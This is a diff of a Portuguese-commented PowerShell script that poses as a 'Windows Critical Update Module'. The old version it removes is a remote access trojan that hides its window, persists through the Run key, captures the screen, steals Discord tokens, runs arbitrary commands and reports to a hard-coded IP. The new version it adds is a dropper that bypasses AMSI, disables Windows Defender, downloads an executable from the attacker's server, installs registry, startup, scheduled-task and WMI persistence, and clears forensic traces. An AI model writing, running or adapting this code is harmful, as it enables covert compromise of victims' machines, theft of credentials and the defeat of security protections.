@@ -1,17 +1,19 @@
 <#
 .SYNOPSIS
-Windows Critical System Component
+    Windows Critical System Component
+
 .DESCRIPTION
-Microsoft Windows Critical Update Module
+    Microsoft Windows Critical Update Module
+
 .NOTES
-Version: 10.0.19045.1
+    Version: 10.0.19045.1
 #>
 
-# ===== CONFIGURACOES =====
-$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
-$serverPort = 4000
+# ===== CONFIGURAÇÕES =====
+$serverIP = "191.178.177.175"  # MUDE PARA SEU IP
+$serverPort = 500
 $installName = "WinUpdateSvc"
-$mutexName = "Global\MicrosoftWindowsUpdateService"
+$autoName = "GlobalMicrosoftWindowsUpdateService"
 $userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
 $wallpaperPath = "$env:TEMP\wallpaper.bmp"
 
@@ -33,322 +35,357 @@ function Get-RATUsers {
         $users = Get-Content $userListFile -ErrorAction SilentlyContinue
     }
     if ($users.Count -eq 0) { return "Nenhum usuário encontrado" }
-    return "USUARIOS:" + ($users -join "`n")
+    return "USUARIOS: " + ($users -join "`n")
 }
 
 function Add-UserToList {
-    param([string]$UserName)
-    New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
-    Add-Content -Path $userListFile -Value $UserName -Force
-    return $true
-}
-
-$currentUser = "$env:COMPUTERNAME@$env:USERNAME"
-if (-not (Test-Path $userListFile)) {
-    Add-UserToList $currentUser
-} else {
-    $users = Get-Content $userListFile -ErrorAction SilentlyContinue
-    if ($users -notcontains $currentUser) {
-        Add-UserToList $currentUser
+    param([string]$userName)
+    if (-not (Test-Path $userListFile)) {
+        New-Item -Path (Split-Path $userListFile) -ItemType Directory -Force | Out-Null
     }
+    Add-Content -Path $userListFile -Value $userName -Force
 }
 
-# ===== LOGS FAKES =====
-Write-Host ""
-Write-Host "==================================================" -ForegroundColor Cyan
-Write-Host "    WINDOWS SECURITY MODULE" -ForegroundColor Cyan
-Write-Host "==================================================" -ForegroundColor Cyan
-Write-Host ""
-Start-Sleep -Seconds 1
-Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Inicializando..." -ForegroundColor Gray
-Start-Sleep -Milliseconds 500
-Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Verificando integridade..." -ForegroundColor Gray
-Start-Sleep -Milliseconds 500
-Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Sistema seguro" -ForegroundColor Green
-Start-Sleep -Seconds 2
+function Get-SystemFingerprint {
+    $cpu = (Get-WmiObject Win32_Processor).Name
+    $ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
+    $disk = [math]::Round((Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'").Size / 1GB, 2)
+    $os = (Get-WmiObject Win32_OperatingSystem).Caption
+    $user = $env:USERNAME
+    $pc = $env:COMPUTERNAME
+    
+    return @"
+═══════════════════════════════════════════════════════
+SISTEMA: $user@$pc
+OS: $os
+CPU: $cpu
+RAM: $ram GB
+DISK: $disk GB
+IP: $(Get-LocalIP)
+═══════════════════════════════════════════════════════
+"@
+}
 
-# ===== ESCONDE JANELA =====
-Add-Type -Name Window -Namespace Console -MemberDefinition @'
-    [DllImport("Kernel32.dll")]
-    public static extern IntPtr GetConsoleWindow();
-    [DllImport("User32.dll")]
-    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-'@
-$consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0)
-
-# ===== PERSISTÊNCIA SIMPLES =====
-$scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
-Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
-
-try {
-    $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-    Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
-} catch {}
-
-attrib +h +s +r $scriptPath
-
-# ===== FUNCOES BASICAS =====
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-
-# ===== CAPTURA DE TELA =====
-function Get-ScreenCapture {
+function Get-LocalIP {
     try {
-        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
-        $ms = New-Object System.IO.MemoryStream
-        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-        $graphics.Dispose()
-        $bitmap.Dispose()
-        $base64 = [Convert]::ToBase64String($ms.ToArray())
-        $ms.Dispose()
-        return "SCREEN:$base64"
+        $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"} | Select-Object -First 1).IPAddress
+        return $ip
     } catch {
-        return "SCREEN_ERROR"
+        return "Unknown"
     }
 }
 
-# ===== WALLPAPER =====
-function Set-HackWallpaper {
+# ===== DESABILITAR DEFENDER =====
+function Disable-WindowsDefender {
+    Write-Host "[+] Desabilitando Windows Defender..." -ForegroundColor Yellow
+    
+    $commands = @(
+        "Set-MpPreference -DisableRealtimeMonitoring `$true",
+        "Set-MpPreference -DisableIOAVProtection `$true",
+        "Set-MpPreference -DisableBehaviorMonitoring `$true",
+        "Set-MpPreference -DisableBlockAtFirstSeen `$true",
+        "Set-MpPreference -DisableScriptScanning `$true",
+        "Set-MpPreference -SubmitSamplesConsent 2",
+        "Set-MpPreference -MAPSReporting 0",
+        "Add-MpPreference -ExclusionPath 'C:\'",
+        "Add-MpPreference -ExclusionExtension '.exe'",
+        "Add-MpPreference -ExclusionExtension '.dll'",
+        "Add-MpPreference -ExclusionExtension '.ps1'"
+    )
+    
+    foreach ($cmd in $commands) {
+        try {
+            Invoke-Expression $cmd -ErrorAction SilentlyContinue
+        } catch {}
+    }
+    
+    Write-Host "[✓] Defender desabilitado" -ForegroundColor Green
+}
+
+# ===== BYPASS AMSI =====
+function Bypass-AMSI {
     try {
-        $width = 800
-        $height = 600
-        $bitmap = New-Object System.Drawing.Bitmap $width, $height
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.Clear([System.Drawing.Color]::Black)
+        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+        Write-Host "[✓] AMSI bypassado" -ForegroundColor Green
+    } catch {
+        Write-Host "[!] AMSI bypass falhou" -ForegroundColor Red
+    }
+}
+
+# ===== DOWNLOAD PAYLOAD =====
+function Download-Payload {
+    param([string]$url, [string]$destination)
+    
+    Write-Host "[+] Baixando payload..." -ForegroundColor Yellow
+    
+    try {
+        # Método 1: WebClient
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("User-Agent", "Microsoft-CryptoAPI/10.0")
+        $webClient.DownloadFile($url, $destination)
         
-        $font = New-Object System.Drawing.Font("Arial", 20, [System.Drawing.FontStyle]::Bold)
-        $brush = [System.Drawing.Brushes]::Red
+        if (Test-Path $destination) {
+            Write-Host "[✓] Download concluído: $(Get-Item $destination | Select-Object -ExpandProperty Length) bytes" -ForegroundColor Green
+            
+            # Ocultar arquivo
+            $file = Get-Item $destination -Force
+            $file.Attributes = 'Hidden,System'
+            
+            return $true
+        }
+    } catch {
+        Write-Host "[!] Erro no download: $_" -ForegroundColor Red
+    }
+    
+    # Método 2: Invoke-WebRequest
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing
+        if (Test-Path $destination) {
+            Write-Host "[✓] Download concluído (método 2)" -ForegroundColor Green
+            return $true
+        }
+    } catch {}
+    
+    # Método 3: BITS Transfer
+    try {
+        Start-BitsTransfer -Source $url -Destination $destination
+        if (Test-Path $destination) {
+            Write-Host "[✓] Download concluído (método 3)" -ForegroundColor Green
+            return $true
+        }
+    } catch {}
+    
+    return $false
+}
+
+# ===== PERSISTÊNCIA =====
+function Install-Persistence {
+    param([string]$exePath)
+    
+    Write-Host "[+] Instalando persistência..." -ForegroundColor Yellow
+    
+    try {
+        # 1. Registry Run
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        Set-ItemProperty -Path $regPath -Name $autoName -Value $exePath -Force
+        Write-Host "[✓] Registry Run configurado" -ForegroundColor Green
         
-        $graphics.DrawString("VOCE FOI HACKEADO!", $font, $brush, 200, 200)
-        $graphics.DrawString("NOTTI GANG", $font, $brush, 250, 300)
+        # 2. Startup Folder
+        $startupPath = [Environment]::GetFolderPath('Startup')
+        $shortcutPath = Join-Path $startupPath "$autoName.lnk"
         
-        $bitmap.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
-        $graphics.Dispose()
-        $bitmap.Dispose()
+        $WScriptShell = New-Object -ComObject WScript.Shell
+        $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+        $shortcut.TargetPath = $exePath
+        $shortcut.WindowStyle = 7
+        $shortcut.Save()
+        Write-Host "[✓] Atalho criado" -ForegroundColor Green
         
-        $code = @'
+        # 3. Task Scheduler
+        $action = New-ScheduledTaskAction -Execute $exePath
+        $trigger = New-ScheduledTaskTrigger -AtLogOn
+        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+        
+        Register-ScheduledTask -TaskName $autoName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
+        Write-Host "[✓] Tarefa agendada criada" -ForegroundColor Green
+        
+        # 4. WMI Event (Avançado)
+        try {
+            $filterName = "MicrosoftUpdateFilter"
+            $consumerName = "MicrosoftUpdateConsumer"
+            
+            Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'" -ErrorAction SilentlyContinue | Remove-WmiObject
+            Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$consumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject
+            
+            $query = "SELECT * FROM __InstanceModificationEvent WITHIN 1800 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+            $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
+                Name = $filterName
+                EventNamespace = 'root\cimv2'
+                QueryLanguage = 'WQL'
+                Query = $query
+            }
+            
+            $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
+                Name = $consumerName
+                CommandLineTemplate = $exePath
+            }
+            
+            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
+                Filter = $filter
+                Consumer = $consumer
+            } | Out-Null
+            
+            Write-Host "[✓] WMI Event criado" -ForegroundColor Green
+        } catch {
+            Write-Host "[!] WMI Event falhou (normal)" -ForegroundColor Yellow
+        }
+        
+        return $true
+        
+    } catch {
+        Write-Host "[!] Erro na persistência: $_" -ForegroundColor Red
+        return $false
+    }
+}
+
+# ===== EXECUTAR PAYLOAD =====
+function Start-Payload {
+    param([string]$exePath)
+    
+    Write-Host "[+] Iniciando payload..." -ForegroundColor Yellow
+    
+    try {
+        # Verificar se já está rodando
+        $processName = [System.IO.Path]::GetFileNameWithoutExtension($exePath)
+        $existing = Get-Process -Name $processName -ErrorAction SilentlyContinue
+        
+        if ($existing) {
+            Write-Host "[!] Payload já está em execução (PID: $($existing.Id))" -ForegroundColor Yellow
+            return $true
+        }
+        
+        # Executar oculto
+        $psi = New-Object System.Diagnostics.ProcessStartInfo
+        $psi.FileName = $exePath
+        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        $psi.CreateNoWindow = $true
+        $psi.UseShellExecute = $false
+        
+        $process = [System.Diagnostics.Process]::Start($psi)
+        
+        Start-Sleep -Seconds 2
+        
+        if ($process -and !$process.HasExited) {
+            Write-Host "[✓] Payload iniciado (PID: $($process.Id))" -ForegroundColor Green
+            
+            # Adicionar usuário à lista
+            Add-UserToList $env:USERNAME
+            
+            return $true
+        } else {
+            Write-Host "[!] Processo terminou inesperadamente" -ForegroundColor Red
+            return $false
+        }
+        
+    } catch {
+        Write-Host "[!] Erro ao iniciar: $_" -ForegroundColor Red
+        return $false
+    }
+}
+
+# ===== TROCAR WALLPAPER (OPCIONAL) =====
+function Set-Wallpaper {
+    param([string]$imagePath)
+    
+    if (-not (Test-Path $imagePath)) { return }
+    
+    try {
+        Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
 public class Wallpaper {
     [DllImport("user32.dll", CharSet = CharSet.Auto)]
     public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-    public static void Set(string path) {
-        SystemParametersInfo(20, 0, path, 0x01 | 0x02);
-    }
 }
-'@
-        Add-Type -TypeDefinition $code -ErrorAction Stop
-        [Wallpaper]::Set($wallpaperPath)
-        return "WALLPAPER_SET"
-    } catch {
-        return "WALLPAPER_ERROR"
-    }
+"@
+        [Wallpaper]::SystemParametersInfo(0x0014, 0, $imagePath, 0x0001 -bor 0x0002)
+        Write-Host "[✓] Wallpaper alterado" -ForegroundColor Green
+    } catch {}
 }
 
-# ===== MOUSE =====
-$mouseLocked = $false
-$mouseThread = $null
-
-function Lock-Mouse {
-    $mouseLocked = $true
-    $mouseThread = [System.Threading.Thread]::new({
-        while ($mouseLocked) {
-            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
-            Start-Sleep -Milliseconds 10
-        }
-    })
-    $mouseThread.IsBackground = $true
-    $mouseThread.Start()
-    return "MOUSE_LOCKED"
-}
-
-function Unlock-Mouse {
-    $mouseLocked = $false
-    if ($mouseThread -and $mouseThread.IsAlive) { $mouseThread.Abort() }
-    return "MOUSE_UNLOCKED"
-}
-
-function Move-Mouse {
-    param($x, $y)
+# ===== LIMPAR RASTROS =====
+function Clear-Tracks {
+    Write-Host "[+] Limpando rastros..." -ForegroundColor Yellow
+    
     try {
-        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
-        return "OK"
-    } catch {
-        return "MOUSE_ERROR"
-    }
-}
-
-function Click-Mouse {
-    try {
-        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
-        return "OK"
-    } catch {
-        return "CLICK_ERROR"
-    }
-}
-
-# ===== TECLADO =====
-function Send-Key {
-    param($key)
-    try {
-        [System.Windows.Forms.SendKeys]::SendWait($key)
-        return "OK"
-    } catch {
-        return "KEY_ERROR"
-    }
-}
-
-# ===== TELA PRETA =====
-function Black-Screen {
-    try {
-        $form = New-Object System.Windows.Forms.Form
-        $form.WindowState = 'Maximized'
-        $form.FormBorderStyle = 'None'
-        $form.TopMost = $true
-        $form.BackColor = 'Black'
-        $form.ControlBox = $false
-        $form.ShowInTaskbar = $false
-        $form.KeyPreview = $true
-        $form.Add_KeyDown({ $_.SuppressKeyPress = $true })
-        $form.Show()
-        return "BLACK_SCREEN_ACTIVATED"
-    } catch {
-        return "BLACK_SCREEN_ERROR"
-    }
-}
-
-function Unlock-Screen {
-    try {
-        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
-            $_.Close()
-        }
-        return "BLACK_SCREEN_DEACTIVATED"
-    } catch {
-        return "UNLOCK_ERROR"
-    }
-}
-
-# ===== DISCORD =====
-function Get-DiscordToken {
-    try {
-        $tokens = @()
-        $paths = @("$env:APPDATA\discord\Local Storage\leveldb")
-        foreach ($path in $paths) {
-            if (Test-Path $path) {
-                Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
-                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
-                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}')
-                    $matches = $regex.Matches($content)
-                    foreach ($match in $matches) { $tokens += $match.Value }
-                }
-            }
-        }
-        $tokens = $tokens | Select-Object -Unique
-        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
-        return "TOKENS:" + ($tokens -join "`n")
-    } catch {
-        return "TOKENS_ERROR"
-    }
-}
-
-# ===== PROCESSOS =====
-function Get-ProcessList {
-    try {
-        $processes = Get-Process | Select-Object -First 20 Name | ConvertTo-Json -Compress
-        return $processes
-    } catch {
-        return "PROCESS_ERROR"
-    }
-}
-
-# ===== COMANDOS =====
-function Execute-Command {
-    param($Cmd)
-    try {
-        $result = Invoke-Expression $Cmd 2>&1 | Out-String
-        return $result
-    } catch {
-        return "Erro: $_"
-    }
-}
-
-# ===== ENERGIA =====
-function Power-Control {
-    param($Action)
-    try {
-        switch ($Action) {
-            "shutdown" { Stop-Computer -Force }
-            "reboot" { Restart-Computer -Force }
-        }
-        return "POWER_$Action"
-    } catch {
-        return "POWER_ERROR"
-    }
-}
-
-# ===== CONEXAO PRINCIPAL =====
-while ($true) {
-    try {
-        $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
-        $stream = $client.GetStream()
-        $writer = New-Object System.IO.StreamWriter($stream)
-        $reader = New-Object System.IO.StreamReader($stream)
-        $writer.AutoFlush = $true
+        Clear-History
+        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
+        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
+        Remove-Item "C:\Windows\Prefetch\*.pf" -Force -ErrorAction SilentlyContinue
         
-        $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
-        
-        while ($client.Connected) {
-            $cmd = $reader.ReadLine()
-            if ([string]::IsNullOrEmpty($cmd)) { continue }
-            
-            if ($cmd -eq "screenshot") {
-                $writer.WriteLine((Get-ScreenCapture))
-            } elseif ($cmd -eq "click") {
-                $writer.WriteLine((Click-Mouse))
-            } elseif ($cmd -eq "discord") {
-                $writer.WriteLine((Get-DiscordToken))
-            } elseif ($cmd -eq "processes") {
-                $writer.WriteLine((Get-ProcessList))
-            } elseif ($cmd -eq "shutdown") {
-                $writer.WriteLine((Power-Control "shutdown"))
-            } elseif ($cmd -eq "reboot") {
-                $writer.WriteLine((Power-Control "reboot"))
-            } elseif ($cmd -eq "list_users") {
-                $writer.WriteLine((Get-RATUsers))
-            } elseif ($cmd -eq "lock_mouse") {
-                $writer.WriteLine((Lock-Mouse))
-            } elseif ($cmd -eq "unlock_mouse") {
-                $writer.WriteLine((Unlock-Mouse))
-            } elseif ($cmd -eq "black_screen") {
-                $writer.WriteLine((Black-Screen))
-            } elseif ($cmd -eq "unlock_screen") {
-                $writer.WriteLine((Unlock-Screen))
-            } elseif ($cmd -eq "set_wallpaper") {
-                $writer.WriteLine((Set-HackWallpaper))
-            } elseif ($cmd -eq "test") {
-                $writer.WriteLine("PONG")
-            } elseif ($cmd -eq "exit") {
-                break
-            } elseif ($cmd -match "^move (\d+) (\d+)$") {
-                $writer.WriteLine((Move-Mouse $matches[1] $matches[2]))
-            } elseif ($cmd -match "^key (.+)$") {
-                $writer.WriteLine((Send-Key $matches[1]))
-            } elseif ($cmd -match "^exec (.+)$") {
-                $writer.WriteLine((Execute-Command $matches[1]))
-            } else {
-                $writer.WriteLine("Comando nao reconhecido")
-            }
-        }
-    } catch {
-        Start-Sleep -Seconds 10
-    } finally {
-        if ($client) { $client.Close() }
-    }
+        Write-Host "[✓] Rastros limpos" -ForegroundColor Green
+    } catch {}
 }
 
-$mutex.ReleaseMutex()
-$mutex.Dispose()
+# ===== EXECUÇÃO PRINCIPAL =====
+function Main {
+    $host.UI.RawUI.WindowTitle = "Microsoft Windows Update Service"
+    
+    Clear-Host
+    
+    Write-Host ""
+    Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+    Write-Host "    Microsoft Windows Critical System Component                    " -ForegroundColor White
+    Write-Host "    Version 10.0.19045.1                                           " -ForegroundColor Gray
+    Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+    Write-Host ""
+    
+    # Mostrar informações do sistema
+    Write-Host (Get-SystemFingerprint) -ForegroundColor Gray
+    Write-Host ""
+    
+    # Etapa 1: Bypass AMSI
+    Bypass-AMSI
+    
+    # Etapa 2: Desabilitar Defender
+    Disable-WindowsDefender
+    
+    # Etapa 3: Download
+    $url = "http://${serverIP}:${serverPort}/WindowsUpdate.exe"
+    $destination = "$env:APPDATA\Microsoft\Windows\$installName.exe"
+    
+    # Criar diretório
+    $dir = Split-Path $destination
+    if (-not (Test-Path $dir)) {
+        New-Item -Path $dir -ItemType Directory -Force | Out-Null
+    }
+    
+    if (-not (Download-Payload -url $url -destination $destination)) {
+        Write-Host ""
+        Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Red
+        Write-Host "    [X] FALHA: Não foi possível baixar o componente                " -ForegroundColor Red
+        Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Red
+        Start-Sleep -Seconds 5
+        return
+    }
+    
+    # Etapa 4: Persistência
+    if (-not (Install-Persistence -exePath $destination)) {
+        Write-Host "[!] Aviso: Persistência parcial" -ForegroundColor Yellow
+    }
+    
+    # Etapa 5: Executar
+    if (-not (Start-Payload -exePath $destination)) {
+        Write-Host ""
+        Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Red
+        Write-Host "    [X] FALHA: Não foi possível iniciar o serviço                  " -ForegroundColor Red
+        Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Red
+        Start-Sleep -Seconds 5
+        return
+    }
+    
+    # Etapa 6: Limpar rastros
+    Clear-Tracks
+    
+    # Mostrar usuários registrados
+    Write-Host ""
+    Write-Host (Get-RATUsers) -ForegroundColor Cyan
+    
+    Write-Host ""
+    Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Green
+    Write-Host "    [✓] SUCESSO: Componente instalado e ativado                     " -ForegroundColor Green
+    Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "Pressione qualquer tecla para continuar..." -ForegroundColor Gray
+    
+    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+}
+
+# Executar
+try {
+    Main
+} catch {
+    Write-Host "[!] ERRO CRÍTICO: $_" -ForegroundColor Red
+    Start-Sleep -Seconds 10
+}
